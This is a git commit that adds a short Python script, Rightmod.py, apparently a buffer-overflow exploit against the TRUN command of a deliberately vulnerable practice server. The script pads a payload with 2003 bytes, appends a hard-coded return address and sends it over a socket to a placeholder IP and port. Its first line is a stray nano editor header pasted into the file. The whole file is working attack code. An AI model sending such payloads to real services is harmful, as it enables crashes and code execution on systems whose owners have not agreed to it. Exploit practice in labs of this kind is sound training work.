07ae665bca841597637b1b9e58a2b165ab145407
ACommodore <CommodoreAlex@users.noreply.github.com>
2023-07-31 16:45:49 -0400

    Create Rightmod.py

---
+++ Rightmod.py
@@ -0,0 +1,16 @@
+  GNU nano 7.2                                    2.py                                             
+#!/usr/bin/python
+import sys, socket
+
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62" 
+payload = "TRUN /.:/" + shellcode
+
+try:
+        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('IP_ADDRESS',PORT))
+        s.send((payload.encode()))
+        s.close()
+except:
+        print("Error conecting to the server")
+        sys.exit()
+
